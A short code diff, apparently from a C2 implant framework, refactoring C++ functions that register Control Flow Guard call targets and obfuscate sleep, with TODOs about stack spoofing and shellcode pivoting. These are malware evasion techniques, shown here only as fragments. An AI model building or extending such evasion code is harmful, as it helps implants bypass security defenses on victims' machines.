@@ -2,14 +2,12 @@
 using namespace Utils::Time;
 using namespace Utils::Random;
 
-BOOL AddValidCallTarget(void* pointer) {
-    HEXANE;
-
+BOOL AddValidCallTarget(LPVOID pointer) {
     CFG_CALL_TARGET_INFO target_info = { };
     EXTENDED_PROCESS_INFORMATION ex_procinfo = { };
 
-    auto base       = ctx->base.address;
-    auto nt_head    = (PIMAGE_NT_HEADERS) base + ((PIMAGE_DOS_HEADER) base)->e_lfanew;
+    auto base       = Ctx->Base.Address;
+    auto nt_head    = (PIMAGE_NT_HEADERS) base + ((PIMAGE_DOS_HEADER)base)->e_lfanew;
 
     ex_procinfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
     ex_procinfo.ExtendedProcessInfoBuffer = 0;
@@ -34,9 +32,7 @@ BOOL AddValidCallTarget(void* pointer) {
 BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 // TODO: finish and implement thread stack spoofing along side
 // TODO: modify with shubakki's pivoting technique: https://sillywa.re/posts/flower-da-flowin-shc/
-    HEXANE;
-
-    bool success = true;
+    BOOL success = true;
     Timeout(RandomSleepTime());
 
     /*
